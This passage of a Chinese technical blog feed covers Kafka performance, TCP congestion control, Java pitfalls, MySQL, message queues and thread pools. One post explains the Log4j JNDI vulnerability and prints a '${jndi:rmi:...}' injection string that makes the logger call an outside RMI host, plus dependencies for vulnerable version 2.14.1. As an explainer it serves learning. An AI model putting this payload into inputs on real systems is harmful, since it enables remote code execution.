简单的说，异步思想就是当我们执行一项比较耗时的操作，不去等待操作结束，而是给这个操作一个命令：当操作完成后，接下来去执行什么。
使用异步编程模型，虽然不能加快程序本身的速度，但可以减少或者避免线程等待，只用很少的线程就可以达到超高的吞吐能力。异步相对同步，实现的复杂度要更大，代码的可读性和可维护性都会下降，而Kafka作为消息队列，业务逻辑简单并且需要超高的吞吐量，所以场景匹配。
高性能的异步网络传输
传统的同步网络IO，一般采用的都是一个线程对应一个Channel接收数据，很难支持高并发和高吞吐量，而异步网络可以用单个线程同时管理多个连接，实现多路复用。
自定义序列化、反序列化协议
进程之间通过网络传输结构化数据，需要通过序列化和反序列化来实现结构化数据和二进制数据的双向转换。大多数情况下，选择一个高性能的通用序列化框架都可以满足需求，但是Kafka为了实现超高的性能，自定义了专用的序列化方法，来提高序列化性能，节省传输流量。
自定义传输协议
自定义私有应用层传输协议
批处理
批处理是一种非常有效的提升系统吞吐量的方法。在Kafka内部，消息都是以批为单位处理的。
Kafka给发送端提供的接口虽然每次只能发送一条消息，但是实际上，Kafka不会立即把这条消息发送出去，而是先在内存中缓存起来，然后选择合适的时机把缓存中的消息组成一批，一次性发给Broker，采用了异步批量发送的机制，攒一波一起发。
在Kafka的服务端，也就是Broker这一端，不会把一批消息再还原成多条消息一条一条处理，在Broker整个处理流程中，无论是写入磁盘、从磁盘读出来、还是复制到其他副本这些流程中，批消息都不会被解开，一直是作为一条“批消息”来处理。在消费时，消息同样是以批为单位传递，Consumer从Broker拉到一批消息后，在客户端把批消息解开，再一条一条的交给用户代码处理。比如说，你在客户端发送 30 条消息，在业务程序看来，是发送了 30 条消息，而对于 Kafka 的 Broker 来说，它其实就是处理了 1 条包含 30 条消息的“批消息”而已。显然处理 1 次请求要比处理 30 次请求要快得多。
构建批消息和解开批消息分别在发送端和消费端的客户端完成，不仅减轻了Broker的压力，最重要的是减少了Broker处理请求的次数，提升了总体的处理能力。
使用顺序读写提升磁盘IO性能
对于磁盘来说，顺序读写的性能要远远好于随机读写。操作系统每次从磁盘读写数据的是够，需要先寻址，也就是先要找到数据在磁盘上的物理位置，然后再进行数据读写。如果是机械硬盘，这个寻址需要比较长的时间，因为他要移动磁头，这是一个机械运动。顺序读写相比随机读写省去了大部分的寻址时间，它只要寻址一次，就可以连续读写下去，性能要比随机读写好的多。
在kafka中，对于每个分区，他把从Producer收到的消息，顺序的写入对应的Log文件中，一个文件写满了，就开启一个新的文件这样顺序写下去。消费的时候，也就是从某个全局的位置开始，也就是某一个Log文件中的某个位置开始，顺序的把消息读出来。Kafka充分的利用了顺序读写的这个特性，极大的提升了Kafka在使用磁盘时的IO性能。
利用PageCache加速消息读写
PageCache就是操作系统在内存中给磁盘上的文件建立的缓存，在调用系统的API读取文件的时候，并不会直接去读写磁盘上的文件，应用程序实际操作的是PageCache，也就是文件在内存中缓存的副本。
应用程序在写入文件的时候，操作系统会先把数据写入到内存中的PageCache，然后再一批一批的写到磁盘上。读取文件的时候，也是从PageCache来读取数据，这个时候有两种可能情况。
PageCache中有数据。直接读取，节省了从磁盘读取数据的时间 PageCache没有数据。操作系统引发缺页中断，应用程序的读取线程会被阻塞，操作系统把数据从文件中复制到PageCache，然后应用程序再从PageCache中继续把数据读出来，这时会进行真正的磁盘IO，读取过程相对较慢。 用户的应用程序在使用完某块PageCache后，操作系统并不会立刻就清除这个PageCache，而是尽可能的利用空闲的物理内存保存这些PageCache，除非系统内存不够用，操作系统才会清掉一部分PageCache，清理策略一般是LRU：优先保留最近一段时间最常使用的那些PageCache。
Kafka在读取消息文件的时候，充分契合了PageCache的特性。一般来说，消息刚刚写到服务端就会被消费，按照LRU的清除策略，读取的时候，对于这种刚刚写入的PageCache，命中的几率会非常高。也就是说，在大部分情况下，消费端读取消息都能命中PageCache，带来的好处有两个：一个一个是读取的速度非常快，另外就是给写入消息让出了磁盘IO资源，间接的提升了写入性能。
零拷贝技术
在服务端，处理消息的大致逻辑是这样：
在文件中找到消息数据，读到内存 把消息通过网络发给客户端 这个过程中，数据会经过两次或者三次复制：
1.从文件复制数据到PageCache，如果命中PageCache，这一步可以省略。
2.从PageCache复制到应用程序的内存空间，也就是我们可以操作的对象所在的内存。
3.从应用程序的内存空间复制到Socket的缓冲区，这个过程就是我们调用网络应用框架的API发送数据的过程。
Kafka使用零拷贝技术可以把这个复制次数减少一次，上面的2、3步骤就可以复制合并成一次复制。直接从PageCache中把数据复制到Socket缓冲区中，这样不仅减少一次数据复制，更重要的是，由于不用把数据复制到用户内存空间，DMA控制器可以直接完成数据复制，不需要CPU参与，速度更快。</description>
    </item>
    
    <item>
      <title>单元测试规范</title>
      <link>https://hanchao666.top/posts/unit-test-pricinple/</link>
      <pubDate>Wed, 23 Feb 2022 18:17:18 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/unit-test-pricinple/</guid>
      <description> 想要成为一名成熟的开发者，就要对自己写过的代码负责。在专业测试介入之前，我们需要通过自测(单元测试 + 接口测试)，来保证程序的基本功能是可以通的，并且单测可以为后续项目代码的修改以及重构提供强有力的质量保证。
单元测试原则
AIR原则，即：
A：Automatic(自动化) I：Independent(独立性) R：Repeatable(可重复) 单元测试目标：语句覆盖率达70%，核心模块的语句覆盖率和分支覆盖率都要达到100%
下面总结如下规范：
提高认知：测试并不是只有测试同学来做，开发一定要完成基本的自测，以便测试同学进行更加专业的测试。不要认为为每个方法增加单测方法并维护是浪费时间的，每个单测可以为方法提供质量保证，是有非常大的收益的。 单测用例之间不能相互调用，也不能依赖执行的先后顺序 单元测试必须全自动执行，禁止人肉参与 必须可重复执行(不能执行一次，测试逻辑就被破坏了) 和数据库相关的单元测试，设定自动回滚机制，不要给数据库造成脏数据；或者给单元测试产生的数据加上明确的前后缀标识作区分。 编写方法代码是要考虑单测方法(分支控制)，使代码变得可测，必要时甚至要对方法进行重构 单测粒度要足够小，至多是类级别，方法级别最好 对于数据库的查询、更新、删除等操作，不能假设数据库的数据是存在的，或者直接操作数据库把数据插入进去，设计用例要逻辑完整，并尽量仿真 核心业务、核心应用、核心模块的增量代码确保单元测试通过，如新增代码，请及时修补单测方法 BCDE原则： B：Border，边界值测试，包括循环边界、特殊取值、特殊时间点、数据顺序等 C：Correct，正确的输入，并得到预期的结果 D：Design，与设计文档相结合，来编写单元测试 E：Error，强制错误信息输入(如：非法数据、异常流程、业务允许外等)，并得到预期的报错结果。 </description>
    </item>
    
    <item>
      <title>理解TCP拥塞控制原理</title>
      <link>https://hanchao666.top/posts/understand-tcp/</link>
      <pubDate>Tue, 22 Feb 2022 18:13:43 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/understand-tcp/</guid>
      <description>TCP作为一个世界通用的协议，由于需要考虑到所有的兼容情况，例如重传、流控等，是一个超级复杂的庞大存在。本篇文章主要探索一下其中的拥塞控制机制，目的是能够理解其流程机制(切忌死记硬背)，来学习其处理问题的思路。
拥塞控制主要包括四个核心算法：慢开始、拥塞避免、快重传、快恢复。
下面选取一个生活中的情景，来比拟一下TCP的拥塞控制机制，道理都是相同的嘛~
故事背景：
汽车厂商，想要给4儿子店发送一批新出厂的汽车
其中：
汽车厂商：发送端
4儿子店：接收端
一批汽车：要发送的数据(车辆需严格按照序列号接收)
两地之间的道路：网络
我们的目的，就是能够保证这一批汽车能够完整的到达目的地，这中间我们需要考虑：避免道路拥堵。
下面来看一下，TCP协议是如何解决这一难题的(会分别对应现实案例)：
1.慢启动 概念先行：
cwnd，即Congestion Window，拥塞窗口，用于控制发送端的发送速率 ssthresh，即slow start threshold，慢启动执行的阈值 慢启动算法如下：
1）连接建好的开始先初始化cwnd = 1，表明可以传一个MSS大小的数据。
2）每当收到一个ACK，cwnd++; 呈线性上升
3）每当过了一个RTT，cwnd = cwnd*2; 呈指数让升
4）ssthresh是一个上限，当cwnd &amp;gt;= ssthresh时，就会进入“拥塞避免算法”
慢启动算法是指数增长，在网速给力的情况下，一个RTT很短，每个ack的返回就很快，其实他一点也不慢~
回到上面的故事，汽车运输专线道路刚刚建立好之后(TCP建立完成)，汽车厂商肯定不会一开始就大批量的往道路上发放汽车，因为这条道路是否拥堵、是否有沟沟坎坎，我们都是未知的，所以一般都会先放一辆试试(cwnd = 1)，打仗行军也是有侦察兵这个概念的对吧，如果第一辆车成功到达4儿子店，那么4儿子店就会给厂商打一个电话(ack)，通知已经收到这辆车了，在这之后，厂商才会逐渐的增加投放的数量(指数级别)，当到达了一个门槛之后(道路的理论可承载力)，进入拥塞避免阶段~
2.拥塞避免 ssthresh（slow start threshold），是一个上限，当cwnd &amp;gt;= ssthresh时，就会进入“拥塞避免算法”。一般来说ssthresh的值是65535，单位是字节，当cwnd达到这个值时后，算法如下：
1）收到一个ACK时，cwnd = cwnd + 1/cwnd
2）当每过一个RTT时，cwnd = cwnd + 1
拥塞避免的主要机制是“加法增大”，也就是将慢启动中的指数增长变为线性增长
解释一下上面的算法：拥塞窗口值的大小就代表能够发送出去的但还没有收到ACK的最大数据报文段，当前窗口的所有报文段全部ack之后，cwnd+1
回到上面的故事，在慢启动中，我把ssthresh叫做“道路的理论可承载力”，理论 表示的是道路修建好之后的参考建议值，其实际的承载力可能更大，厂商作为一个资本家，肯定是想把这条路的运载能力榨干的，所以加下来车辆的发放速度就变指数为线性，如果上一批车辆全部到达了，那么下一批就会再增加一辆，来逐渐接近道路的最大承载力。所以这个过程也是存在风险的，一旦突破最大承载力道路拥堵(出现网络拥塞)，怎么办？
继续来看TCP是如何解决的。
3.快重传 &amp;amp; 快恢复 拥塞状态时的算法
当丢包的时候，会有两种情况：
1）等到RTO超时，重传数据包。TCP认为这种情况太糟糕，反应也很强烈。
sshthresh = cwnd /2 cwnd 重置为 1 进入慢启动过程 2）发送方收到3个duplicate ACK时就开启重传，而不用等到RTO超时。</description>
    </item>
    
    <item>
      <title>List的坑儿</title>
      <link>https://hanchao666.top/posts/confusing-list/</link>
      <pubDate>Wed, 12 Jan 2022 17:59:27 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/confusing-list/</guid>
      <description>有一个著名的公式：程序=数据结构+算法。Java的集合类包括Map和Collection两大类，而Collection又包括List、Set和Queue三个小类，其中List在业务代码中几乎是最经常使用的，下面梳理一下使用List常见的几个坑。
Arrays.asList使用 基本数据类型数组转换为List不能使用Arrays.asList() 如下代码：
int[] arr = {1, 2, 3}; List list = Arrays.asList(arr); log.info(&amp;#34;list:{},size:{},class:{}&amp;#34;, list, list.size(), list.get(0).getClass()); 执行结果为：list:[[I@4bc222e],size:1,class:class [I
结果并不是我们期待的输出List{1,2,3}数组，List包含的是一个int数组，元素类型是整数数组。原因是虽然Java支持int到Integer的自动装箱，但是不支持int[]到Integer[]的自动装箱，而Arrays.asList的源码为：
public static &amp;lt;T&amp;gt; List&amp;lt;T&amp;gt; asList(T... a) { return new ArrayList&amp;lt;&amp;gt;(a); } asList方法传入的是一个泛型T的可变参数，最终int数组整体作为了一个对象成为了泛型类型T。
改进修复方式有两种：
如果是Java8以上版本，可以使用Arrays.stream进行转换 int[] arr = {1,2,3}; List&amp;lt;Integer&amp;gt; collect = Arrays.stream(arr).boxed().collect(Collectors.toList()); log.info(&amp;#34;list:{},size:{},class:{}&amp;#34;, collect, collect.size(), collect.get(0).getClass()); 2.把int数组声明为Integer数组进行转换
修复之后，我们可以得到一个List列表，但是接下来的使用操作还有坑。
如下代码：
String[] arr1 = {&amp;#34;1&amp;#34;, &amp;#34;2&amp;#34;, &amp;#34;3&amp;#34;}; List&amp;lt;String&amp;gt; stringList = Arrays.asList(arr1); arr1[1] = &amp;#34;4&amp;#34;; try { stringList.add(&amp;#34;5&amp;#34;); } catch (Exception e) { e.</description>
    </item>
    
    <item>
      <title>Log4j漏洞攻击原理</title>
      <link>https://hanchao666.top/posts/log4j-attack/</link>
      <pubDate>Sat, 25 Dec 2021 17:48:25 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/log4j-attack/</guid>
      <description>在轰动互联网的log4j漏洞之后，复现总结一下该漏洞原理。
1.触发形式 就是打印个日志，怎么就有安全漏洞了？我们需要跳出常规化思考，如果计算机世界所有情况都是正常的，我们写代码也就不要那么多的try catch了。触发漏洞的入口，就在于log4j中的lookup方法，lookup方法在log4j中是如何使用的呢？
当我们正常进行日志的打印时，是没有问题的，例如：
public void login(string name){ String name = &amp;#34;test&amp;#34;; //表单接收name字段 logger.info(&amp;#34;{},登录了&amp;#34;, name); //logger为log4j } 但是logger.info中的{}是支持通配符的模式的，如果使用下面的代码片段：
public void login(string name){ String name = &amp;#34;{$java:os}&amp;#34;; //用户输入的name内容为 {$java:os} logger.info(&amp;#34;{},登录了&amp;#34;, name); //logger为log4j } 那么打印出的结果就是 Windows 7 6.1 Service Pack 1, architecture: amd64-64，登录了
如果要是输入以下形式的通配符：
public void login(string name){ String name = &amp;#34;${jndi:rmi:192.168.9.23:1099/remote}&amp;#34;; //用户输入的name内容为 jndi相关信息 logger.info(&amp;#34;{},登录了&amp;#34;, name); } 那么lookup方法就会通过RMI进行远程方法调用，如果黑客在远端服务部署攻击脚本，GG。
下面逆流而上，复现一个这个攻击过程~
导入相关依赖 &amp;lt;dependencies&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;log4j-api&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;2.14.1&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;log4j-core&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;2.14.1&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;/dependencies&amp;gt; log4j.</description>
    </item>
    
    <item>
      <title>一条SQL执行很慢的原因</title>
      <link>https://hanchao666.top/posts/slow-sql-reason/</link>
      <pubDate>Sun, 07 Nov 2021 17:22:19 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/slow-sql-reason/</guid>
      <description>分情况讨论：
大多数情况下是正常的，但是偶尔会很慢 数据量不变，这条语句一直就很慢 一.偶尔很慢 1.数据库正在刷新脏页 当我们对数据库进行更新时，并没有直接修改磁盘文件，而是将内存数据页进行更新，然后再将更新的记录追加到redo log日志中，等到一定的时机，再将内存数据页刷新到磁盘数据页中去
当内存数据页跟磁盘数据页内容不一致的时候，我们称这个内存页为“脏页”。内存数据写入到磁盘后，内存和磁盘上的数据页的内容就一致了，称为“干净页”。
上面说的是一定的时机刷新脏页，那么是什么时机呢？
redo log写满了： 如果数据库一直很忙，更新操作又很频繁，那么这时候日志文件满了之后，就要进行类似于JVM中STW的操作，暂停一切更新操作，来全力的执行刷新脏页操作，这个过程更新操作性能下降，不，是消失为0，所以就会导致sql语句执行突然变慢，类似于抖动的感觉，下一次执行就很慢再出现这种情况了
内存不够用了： 当需要新的内存页时，要申请内存，但是这时出现内存不足的情况，就会通过相应的页面置换算法淘汰掉一部分页面，如果被淘汰的是干净页，那没啥说的，直接释放，如果是脏页还要进行向磁盘数据页中刷新脏页的操作
InnoDB用缓冲池buffer pool来管理内存，缓冲池中的内存页有三种状态：
还没使用 使用了并且是干净页 使用了并且是脏页 InnoDB的策略是尽量使用内存，因此对于一个长时间运行的库来说，未被使用的页面很少。当要读入的数据页没有在内存的时候，就必须到缓冲池中申请一个数据页。这时候只能把最久不使用的数据页从内存中淘汰掉：如果要淘汰的是一个干净页，就直接释放出来复用；当如果是脏页，就必须先讲脏页刷盘，变成干净页后才能复用。所以刷脏页是常态。 mysql认为系统空闲的时候
mysql正常关闭的时候
2.拿不到锁 这种情况在并发访问数据库的时候也会发生，当我的sql语句要访问的表或者表的某些行加上了表级锁或者行级锁，并且其他人正在占用锁的时候，那么就只能慢慢等待人家释放锁了
在mysql中可以使用 show processlist查看相应占用者
二.一直很慢 1.没用到索引 没用到索引还是两种情况：
没有建立索引：这种情况没啥可说的，每一次都是全表扫描 有索引但是没用上：这就需要考虑索引失效的问题，索引失效与优化详解 2.数据库自己选错索引 这个概念还是第一次听到，这里有一篇分析的非常好的文章，MySQL为什么有时候会选错索引？，可以仔细研读一下
三.总结 一个 SQL 执行的很慢，我们要分两种情况讨论：
1、大多数情况下很正常，偶尔很慢，则有如下原因
(1)、数据库在刷新脏页，例如 redo log 写满了需要同步到磁盘。
(2)、执行的时候，遇到锁，如表锁、行锁。
2、这条 SQL 语句一直执行的很慢，则有如下原因。
(1)、没有用上索引：例如该字段没有索引；由于对字段进行运算、函数操作导致无法用索引。
(2)、数据库选错了索引。
关于数据库选错索引需要着重理解一下，这里面是和mysql的优化器的统计工作相关的，里面还涉及到了索引的区分度等概念，值得重视起来</description>
    </item>
    
    <item>
      <title>单例模式</title>
      <link>https://hanchao666.top/posts/singleton/</link>
      <pubDate>Wed, 03 Nov 2021 16:48:51 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/singleton/</guid>
      <description>概述：
单例模式用来保证一个类只有一个实例存在，避免对象的重复创建，减少创建对象的时间消耗，如果一个对象可以贯穿整个应用程序，起到统一控制管理的作用，例如线程池，那么单例模式是一个不错的选择。
下面介绍单例模式的实现方法：
1.饿汉模式 public class Singleton{ private static Singleton instance = new Singleton(); private Singleton(){} public static Singleton newInstance(){ return instance; } } 类的构造方法定义为private，保证其他类不能实例化此类，然后提供了一个静态实例并返回给调用者。饿汉模式在类加载的时候就创建，优点是只在类加载的时候创建一次实例，多线程同时调用getInstance()方法不会出现线程安全问题，多个线程同时调用不会在内存中创建多个对象，只要调用这个方法就会立即返回对象，这是一种用空间换取时间的行为，但是缺点就是可能创建好之后在内存中不会被使用，造成了空间的浪费饿汉模式适合单例占用内存比较小，而且会被用到的概率比较大的情况，如果单例比较大，就使用下面的懒加载模式
2.懒汉模式 public class Singleton{ private static Singleton instance = null; private Singleton(){} public static Singleton newInstance(){ if(null == instance){ instance = new Singleton(); } return instance; } } 这种模式是需要单例的时候采取创建，但是最大的缺点就是线程安全问题，如果多个线程同时调用getInstance()方法，那么就会创建多个实例
下面是加锁形式：
3.双重检查锁 public static Singleton getInstanceDC() { if (_instance == null) { // Single Checked synchronized (Singleton.</description>
    </item>
    
    <item>
      <title>使用消息队列要考虑的四个问题</title>
      <link>https://hanchao666.top/posts/4-q-when-use-mq/</link>
      <pubDate>Sun, 17 Oct 2021 17:45:58 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/4-q-when-use-mq/</guid>
      <description>0.如何进行消息队列的选型 1.消息队列的选择 开源：出现问题可以查看源码解决，而不是被动的等待新版本发布 社区活跃：其他人也会遇到相同的使用问题 生态环境：kafka的生态环境和大数据环境完全匹配兼容 基本特性：作为消息队列，要保证不丢消息，高可用，并且性能也要可观，能够满足绝大多数场景的性能需求 2.可供选择的消息队列 目前没有一款消息队列能够做到一统天下，这一块还是比较多元化的， 需要我们熟悉理解每个消息队列的特性，然后根据具体的业务场景，选用合适的消息队列
RabbitMQ 关键词就是轻量级，使用Erlang语言编写，支持AMQP协议
一个特色就是在生产者和队列之前加入了Exchange模块进行路由配置，路由规则是比较灵活的，可以手动进行配置
缺点：
1.对消息积压的支持并不好，他的设计理念认为消息队列就是一个通道，当消息积压时，性能会急剧下降
2.性能不如其他的消息队列，正常情况下，普通的业务场景是可以满足的，但是当系统对性能要求比较高的时候，就不要选择这个了
3.这玩意是使用Erlang语言开发的，比较冷门，不容易进行二次开发
RocketMQ 阿里爸爸开发出来的消息队列，经历了世界上最大并发量、吞吐量的双十一的考验，可见是多么牛逼
使用Java语言写的，因为阿里主要搞电商，RcoketMQ对在线业务的时延响应做了很多优化
RocketMQ方方面面都不错如果非要挑出什么缺点，那么就是和kafka相比，生态还不够好
kafka 消息队列这一块扛把子的老大哥，之前刚出来的时候是为了解决海量日志的，那时候还不能保证丢消息，但是发展到现在已经可以确保消息不丢了，整体设计采用大量的异步和批处理的思想，在所有消息队列里面性能算是最好的，但是正是因为kafka采用异步、批处理的思想，所以对于一些实时性比较高的在线业务来讲，时延会比较高，因为kafka的很多地方都是攒够一波一起发这样做的，如果消息不是那么多的时候，时延就会比较大
如果消息队列不是业务系统的核心，我们对消息队列也没什么特别的要求，那么选择Rabbit就可以了，他就是为了开箱即用的特点诞生的，轻量级，也很OK
如果业务系统对时延要求比较高，吞吐量也比较大的话，那么选用RocketMQ或者JMQ吧，不仅可以保证低时延，也可以保证金融级别的稳定
如果需要处理海量的数据，或者说系统中使用了大数据生态系统中的东西，那么就直接选用kafka， 性能好，生态好
不过我的了解是，目前很多的系统都是采用了不止一种消息队列，而是采用组合的方式，例如：RocketMQ+Kafka，分别用于在线业务和日志，这样就可以兼顾两个的优点，随之带来的问题就是开发维护成本变高了
1.如何保证消息不丢 一个消息队列立足之根本，就是要保证消息不丢失，那么具体是如何实现的呢？哪些地方可能会导致消息丢失呢？
无非就是以下三个阶段可能会导致消息丢失：
生产阶段 存储阶段 消费阶段 现在市面上的主流消息队列都可以保证消息不丢，不管是网络出现问题，还是节点出现宕机，都可以保证消息不丢，很多情况下都是开发者使用不当导致的
下面分别看一下这三个阶段，是如何做到不丢消息的：
生产阶段： 生产阶段普遍采用的是请求确认机制，生产者发出消息之后，当Broker收到消息之后，会返回一个确认响应，如果生产者收到这个响应，那么说明发送成功， 如果没收到，就会进行超时重试，这里面会涉及到一个问题，为什么生产者没有收到响应？可能是两个原因：1.因为网络问题，消息确实在传输过程中丢了，这种情况下进行重试，可以保证Broker收到消息，2.Broker收到了消息，但是响应因为网络问题丢了，这个时候生产者还是会进行重发，这就会导致主题上面可能会有重复消息，这也是我们接下来需要考虑的一个问题，消息重复了怎么办？
存储阶段： 存储阶段还是分两种情况，如果Broker是单机的，那么需要保证消息落盘之后，再返回确认响应，这时候消息已经在磁盘中进行了持久化，就不会丢，如果Broker是集群形式的，那么可以通过配置，当消息在其他Broker节点上进行复制成功之后，再返回确认响应，当一个Broker宕机之后，其他的就可以进行补上 消费阶段： 消费阶段和生产类似，也是通过确认机制来保证消息的不丢，当消费者客户端拿到消息之后，不要立即返回确认响应，而是在完成所有消费业务逻辑之后，再发送确认响应，这样如果在消费消息阶段失败了，那么下一次消费时可以继续消费上一次消费位置的消息，这里还有一种情况：如果消费者发出的消费确认响应丢了怎么办？这里还会涉及到重复消息的问题，后面我们一起讨论 一个合格的消息队列，上面的三个阶段都是可以严格保证消息不丢的，实际上我们在使用消息队列的时候，丢失消息的原因大多数是消费位置的不当导致的，因为目前大多数消息队列都是基于发布订阅模型的，每个消息都可以被多个消费者组消费，每个消费者组是互不影响的，而一个消费者组中的每个消费者是存在竞争关系的，当主题中的一个消息被一个消费者组消费完成之后，不能立即将消息删除，因为其他消费者组后面可能还会进行消费，这是我们需要为每个消费者组维持一个消费位置的变量
2.消息重复怎么办 首先明确一个立场：不管是在哪一种消息队列中，都可能存在重复消息的情况。
之前的问题中已经埋下了一个伏笔，也就是在生产者如果可能会将重复的消息发送到消息队列中，所有的消息队列都是At least Once级别的，之前就听说过Kafka可以保证Exactly Once级别，但是玥哥也是说了，这主要是为了配合流计算领域的实现，在消息的生产消费关系中，消息队列中 也是可能存在重复消息的！后面会单独写一篇文章，说一下事务和Exactly Once在流计算中是怎么搞的，既然消息队列中存在重复消息这件事情已经成为了既定的事实，那么我们只能通过在消费端的业务中实现幂等性来保证了，这样就可以满足：**At least once + 幂等消费 = Exactly once
下面是几种实现幂等性的方法：
利用数据库的唯一性实现 大概的思路就是利用数据库的主键的特性，当消息重复时，消费者在数据库表中可以检测到主键冲突异常，这样就可以不用进行接下来的重复消费
设置相关判定条件 比如，“将账户 X 的余额增加 100 元”这个操作并不满足幂等性，我们可以把这个操作加上一个前置条件，变为：“如果账户 X 当前的余额为 500 元，将余额加 100 元”，这个操作就具备了幂等性。对应到消息队列中的使用时，可以在发消息时在消息体中带上当前的余额，在消费的时候进行判断数据库中，当前余额是否与消息中的余额相等，只有相等才执行变更操作。</description>
    </item>
    
    <item>
      <title>计算机世界有趣的权衡</title>
      <link>https://hanchao666.top/posts/intreasting-trade-off-in-cs/</link>
      <pubDate>Mon, 13 Sep 2021 14:13:51 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/intreasting-trade-off-in-cs/</guid>
      <description>越来越发现计算机科学中主要讨论的就是权衡取舍，这里作为一个梳理列表，会不定期更新。
计算机存储中访问速度和容量 在上面的金字塔层次结构中，从上到下，设备的访问时延越来越大，容量也越来越大。
分布式集群数据复制 在分布式存储中一般使用持久化和复制的方式来保证数据的高可用，数据在节点间进行复制时，需要写入的节点越多，可用性和数据可靠性就越高，但是写入性能就越低，这是一个天然的矛盾。
并发控制理论 隔离程度与并发能力是相互抵触的，隔离程度越高，并发访问时的吞吐量就越低。 https://en.wikipedia.org/wiki/Concurrency_control?useskin=vector</description>
    </item>
    
    <item>
      <title>线程池的理解和总结</title>
      <link>https://hanchao666.top/posts/thread-pool/</link>
      <pubDate>Thu, 09 Sep 2021 17:24:49 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/thread-pool/</guid>
      <description>1.为什么要使用线程池
其实这个问题和数据库连接池、字符串常量一样，都是使用了池化技术，池化技术可以降低每次重复创建和销毁的开销，尤其是对于线程或者数据库连接这种大对象，使用池化技术是非常必要的，如果并发的线程数量比较多，每个线程只是执行一个时间很短的任务就结束了，这样频繁的创建和销毁线程会大大降低系统的性能
那么下面来详细说一下线程池的好处：
降低资源消耗：通过重复利用已创建的线程来降低线程创建和销毁的消耗 提高响应速度：当任务到达时，不必等待创建新的线程，任务到达可以立即执行 提高系统的管理性：线程是一个很大的对象，不能无限制的创建，需要使用线程池来进行统一的控制 2.线程池基本结构 线程池的工作模型主要两部分组成，一部分是运行Runnable的Thread对象，另一部分就是阻塞队列。
由线程池创建的Thread对象其内部的run方法会通过阻塞队列的take方法获取一个Runnable对象，然后执行这个Runnable对象的run方法（即，在Thread的run方法中调用Runnable对象的run方法）。当Runnable对象的run方法执行完毕以后，Thread中的run方法又循环的从阻塞队列中获取下一个Runnable对象继续执行。这样就实现了Thread对象的重复利用，也就减少了创建线程和销毁线程所消耗的资源。
当需要向线程池提交任务时会调用阻塞队列的offer方法向队列的尾部添加任务。提交的任务实际上就是是Runnable对象或Callable对象。
3.Java中的ThreadPoolExecutor类 java.uitl.concurrent.ThreadPoolExecutor类是线程池中最核心的一个类，如果我们想要深入理解线程池，就一定要熟悉这个类
ThreadPoolExecutor类提供了四个构造方法：
public ThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&amp;lt;Runnable&amp;gt; workQueue) { this(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, Executors.defaultThreadFactory(), defaultHandler); } public ThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&amp;lt;Runnable&amp;gt; workQueue, ThreadFactory threadFactory) { this(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, defaultHandler); } public ThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&amp;lt;Runnable&amp;gt; workQueue, RejectedExecutionHandler handler) { this(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, Executors.</description>
    </item>
    
    <item>
      <title>Java ArrayList源码解析</title>
      <link>https://hanchao666.top/posts/arraylist/</link>
      <pubDate>Mon, 12 Jul 2021 17:31:14 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/arraylist/</guid>
      <description>1. ArrayList为什么线程不安全 public class ArrayList&amp;lt;E&amp;gt; extends AbstractList&amp;lt;E&amp;gt; implements List&amp;lt;E&amp;gt;, RandomAccess, Cloneable, java.io.Serializable { /** * 列表元素集合数组 * 如果新建ArrayList对象时没有指定大小，那么会将DEFAULTCAPACITY_EMPTY_ELEMENTDATA赋值给elementData， * 并在第一次添加元素时，将列表容量设置为DEFAULT_CAPACITY */ transient Object[] elementData; /** * 列表大小，elementData中存储的元素个数 */ private int size; } 通过这两个字段我们可以看出，ArrayList的实现主要就是用了一个Object的数组，用来保存所有的元素，以及一个size变量用来保存当前数组中已经添加了多少元素。
接下来查看add方法源码：
/** * Appends the specified element to the end of this list. * * @param e element to be appended to this list * @return &amp;lt;tt&amp;gt;true&amp;lt;/tt&amp;gt; (as specified by {@link Collection#add}) */ public boolean add(E e) { ensureCapacityInternal(size + 1); // Increments modCount!</description>
    </item>
    
    <item>
      <title>synchronized关键字的理解</title>
      <link>https://hanchao666.top/posts/understand-synchronized/</link>
      <pubDate>Thu, 01 Jul 2021 18:09:27 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/understand-synchronized/</guid>
      <description>1.概述 我们知道在并发编程中最为重要的就是线程安全问题，而线程安全的主要体现，就是原子性、可见性和有序性。当存在多个线程操作共享数据时，需要保证同一时刻有且只有一个线程在操作共享数据，其他线程必须等到该线程处理完数据后再进行，这种方式有个高尚的名称叫互斥锁，即能达到互斥访问目的的锁，也就是说当一个共享数据被当前正在访问的线程加上互斥锁后，在同一个时刻，其他线程只能处于等待的状态，直到当前线程处理完毕释放该锁。而synchronied关键字，可以很好的实现上述要求
synchronized关键字主要有三种应用方式：
